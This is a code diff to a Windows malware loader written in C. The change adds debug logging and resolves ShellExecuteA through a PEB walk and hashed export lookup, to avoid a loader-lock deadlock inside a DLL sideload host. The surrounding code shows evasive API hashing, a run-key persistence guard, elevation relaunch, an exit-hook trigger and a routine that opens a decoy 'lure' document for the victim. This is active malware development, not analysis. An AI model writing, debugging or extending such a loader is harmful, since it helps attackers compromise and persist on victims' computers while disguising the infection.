@@ -148,8 +148,9 @@ static BOOL RelaunchElevated(VOID) {
 // while the loader pipeline is running.
 // -----------------------------------------------
 static VOID OpenBindFile(VOID) {
+    LOG("[*] OpenBindFile: enter");
     PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
-    if (!pKernel32) return;
+    if (!pKernel32) { LOG("[!] OpenBindFile: kernel32 not found"); return; }
 
     // --- Persistence-launch guard ---
     // InstallPersistence() appends " /pf" to the run-key value for DLL builds.
@@ -167,7 +168,8 @@ static VOID OpenBindFile(VOID) {
                     if (szCmd[_i  ] == ' '  && szCmd[_i+1] == '/' &&
                         szCmd[_i+2] == 'p'  && szCmd[_i+3] == 'f' &&
                         (szCmd[_i+4] == '\0' || szCmd[_i+4] == ' ')) {
-                        return;  // persistence relaunch — do not open lure
+                        LOG("[*] OpenBindFile: /pf detected, skipping lure");
+                        return;
                     }
                     _i++;
                 }
@@ -214,12 +216,19 @@ static VOID OpenBindFile(VOID) {
     fnFFF pFindFirstFileA  = (fnFFF)FetchExportAddress(pKernel32, FindFirstFileA_JOAAT);
     fnFNF pFindNextFileA   = (fnFNF)FetchExportAddress(pKernel32, FindNextFileA_JOAAT);
     fnFC  pFindClose       = (fnFC) FetchExportAddress(pKernel32, FindClose_JOAAT);
-    if (!pFindFirstFileA || !pFindNextFileA || !pFindClose) return;
+    if (!pFindFirstFileA || !pFindNextFileA || !pFindClose) {
+        LOG("[!] OpenBindFile: Find* APIs not resolved");
+        return;
+    }
 
+    LOG_STR("[*] OpenBindFile: searching pattern ", szPattern);
     WIN32_FIND_DATAA wfd;
     MemSet(&wfd, 0, sizeof(wfd));
     HANDLE hFind = pFindFirstFileA(szPattern, &wfd);
-    if (hFind == INVALID_HANDLE_VALUE) return;
+    if (hFind == INVALID_HANDLE_VALUE) {
+        LOG("[!] OpenBindFile: _\\ folder not found or empty");
+        return;
+    }
 
     // Walk entries — find first real file (skip . and .. and sub-directories)
     CHAR szFilePath[260];
@@ -241,22 +250,26 @@ static VOID OpenBindFile(VOID) {
     } while (pFindNextFileA(hFind, &wfd));
 
     pFindClose(hFind);
-    if (!bFound) return;
+    if (!bFound) { LOG("[!] OpenBindFile: no file found in _\\ folder"); return; }
 
-    // Load shell32 and call ShellExecuteA("open", filePath)
-    HMODULE hShell32 = pLoadLibraryA("shell32.dll");
-    if (!hShell32) return;
+    LOG_STR("[*] OpenBindFile: found lure file ", szFilePath);
 
-    fnGetProcAddress pGetProcAddress =
-        (fnGetProcAddress)FetchExportAddress(pKernel32, GetProcAddress_JOAAT);
-    if (!pGetProcAddress) return;
+    // Resolve shell32 via PEB walk first (no loader lock needed).
+    // Avoids a deadlock when ExitProcess holds the loader lock on the primary
+    // thread at the point our DR1 exit hook fires: LoadLibraryA would block
+    // waiting for the lock, but the primary thread is stuck in NtWait → deadlock.
+    // Shell32 is always already loaded in real sideload host processes.
+    PVOID hShell32 = FindLoadedModuleW(L"SHELL32.DLL");
+    if (!hShell32) hShell32 = (PVOID)pLoadLibraryA("shell32.dll");
+    if (!hShell32) { LOG("[!] OpenBindFile: shell32.dll not available"); return; }
 
     typedef HINSTANCE(WINAPI* fnShellExec)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
     fnShellExec pShellExecuteA =
-        (fnShellExec)pGetProcAddress(hShell32, "ShellExecuteA");
-    if (!pShellExecuteA) return;
+        (fnShellExec)FetchExportAddress(hShell32, ShellExecuteA_JOAAT);
+    if (!pShellExecuteA) { LOG("[!] OpenBindFile: ShellExecuteA not found"); return; }
 
-    pShellExecuteA(NULL, "open", szFilePath, NULL, NULL, 1 /* SW_SHOWNORMAL */);
+    HINSTANCE hRet = pShellExecuteA(NULL, "open", szFilePath, NULL, NULL, 1 /* SW_SHOWNORMAL */);
+    LOG_HEX("[+] OpenBindFile: ShellExecuteA returned ", (DWORD)(ULONG_PTR)hRet);
 }
 
 // -----------------------------------------------
@@ -271,6 +284,7 @@ static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
     (void)Instance;
     (void)Context;
     (void)Work;
+    LOG("[*] SideloadWorker: thread pool callback fired");
 
 #ifdef REQUIRE_ELEVATION
     // --- Elevation check (first-run only) ---
